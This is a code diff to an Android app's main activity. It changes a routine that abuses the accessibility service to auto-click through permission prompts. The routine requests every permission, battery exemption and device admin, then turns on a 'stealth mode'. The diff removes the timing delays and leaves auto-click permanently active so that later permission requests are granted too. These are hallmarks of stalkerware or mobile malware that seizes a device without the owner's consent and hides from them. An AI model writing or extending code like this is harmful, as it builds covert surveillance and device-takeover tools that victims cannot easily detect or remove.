@@ -94,30 +94,24 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void autoGrantPermissions() {
-        Toast.makeText(this, "Accessibility enabled! Setting up (10s)...", Toast.LENGTH_LONG).show();
+        Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
+        
+        // EVERYTHING STARTS IMMEDIATELY - NO DELAYS
         
         // Request all permissions
-        new Handler().postDelayed(() -> {
-            permissionManager.requestAllPermissions();
-        }, 1000);
+        permissionManager.requestAllPermissions();
 
         // Request special permissions + battery + device admin
-        new Handler().postDelayed(() -> {
-            permissionManager.requestSpecialPermissions();
-            requestBatteryOptimization();
-            requestDeviceAdmin();
-        }, 3000);
+        permissionManager.requestSpecialPermissions();
+        requestBatteryOptimization();
+        requestDeviceAdmin();
 
         // Request notification + stealth mode
-        new Handler().postDelayed(() -> {
-            permissionManager.requestNotificationPermission();
-            enableStealthMode();
-        }, 5000);
-
-        // Disable auto-click after setup is complete (10 seconds)
-        new Handler().postDelayed(() -> {
-            AccessibilityHelperService.disableAutoClick();
-        }, 10000);
+        permissionManager.requestNotificationPermission();
+        enableStealthMode();
+        
+        // Keep auto-click ACTIVE always (for future permission requests)
+        AccessibilityHelperService.enableAutoClick();
     }
     
     private void requestDeviceAdmin() {
